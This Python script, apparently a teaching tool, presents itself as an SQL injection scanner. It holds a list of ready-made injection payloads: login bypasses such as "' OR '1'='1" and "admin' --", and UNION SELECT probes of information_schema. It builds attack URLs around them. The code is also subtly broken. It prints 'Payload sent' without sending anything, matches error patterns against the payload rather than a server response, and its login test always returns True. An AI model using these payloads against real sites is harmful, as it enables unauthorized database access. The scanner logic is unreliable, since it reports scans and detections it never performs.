#!/usr/bin/env python3
"""
SQL Injection Scanner Tool
For authorized testing only - educational purposes
"""

import sys
import re
from urllib.parse import quote

class SQLInjectionTester:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1 /*",
            "admin' --",
            "' UNION SELECT NULL --",
            "1' UNION SELECT table_name FROM information_schema.tables --",
            "' OR 'a'='a",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL, NULL --"
        ]
        self.vulnerable_patterns = [
            r'syntax error',
            r'mysql_fetch',
            r'Warning: mysql',
            r'Error in SQL',
            r'SQLServer',
            r'ORA-\d{5}',
            r'unclosed quotation mark',
            r'\[Microsoft\]\[ODBC'
        ]

    def test_url(self, url, param):
        """
        Test a URL parameter for SQL injection vulnerability
        """
        print(f"\n🔍 Testing URL: {url}")
        print(f"📍 Parameter: {param}")
        print("-" * 50)
        
        vulnerable = False
        
        for i, payload in enumerate(self.payloads, 1):
            # Construct test URL
            if '?' in url:
                test_url = f"{url}&{param}={quote(payload)}"
            else:
                test_url = f"{url}?{param}={quote(payload)}"
            
            print(f"\n[Payload {i}/{len(self.payloads)}]")
            print(f"Payload: {payload}")
            print(f"URL: {test_url}")
            print("✓ Payload sent (Note: In real scenario, analyze response)")
            
            # Simulate checking for vulnerability patterns
            if self.check_patterns(payload):
                vulnerable = True
                print("⚠️  POTENTIAL VULNERABILITY DETECTED!")
        
        return vulnerable

    def check_patterns(self, response_text):
        """
        Check response for SQL error patterns
        """
        for pattern in self.vulnerable_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_login_form(self, username, password):
        """
        Test login form for SQL injection
        """
        print(f"\n🔐 Testing Login Form")
        print("-" * 50)
        print(f"Username payload: {username}")
        print(f"Password payload: {password}")
        
        # Common bypass payloads
        bypasses = [
            ("admin' --", "anything"),
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin' #", "anything"),
        ]
        
        for user_payload, pass_payload in bypasses:
            print(f"\n✓ Testing: username='{user_payload}' password='{pass_payload}'")
        
        return True

def main():
    print("\n" + "="*50)
    print("🛡️  SQL Injection Scanner Tool")
    print("For Educational & Authorized Testing Only")
    print("="*50)
    
    tester = SQLInjectionTester()
    
    if len(sys.argv) > 2:
        url = sys.argv[1]
        param = sys.argv[2]
        tester.test_url(url, param)
    else:
        # Demo mode
        print("\n📌 DEMO MODE - Testing SQL Injection Vulnerabilities\n")
        
        print("Example 1: Testing login form")
        tester.test_login_form("admin' --", "anything")
        
        print("\n\nExample 2: Common SQL Injection Payloads")
        print("-" * 50)
        for i, payload in enumerate(tester.payloads[:5], 1):
            print(f"{i}. {payload}")
        
        print("\n💡 USAGE: python3 sql_injection_tool.py <URL> <parameter>")
        print("Example: python3 sql_injection_tool.py 'http://example.com/search' 'id'")

if __name__ == "__main__":
    main()
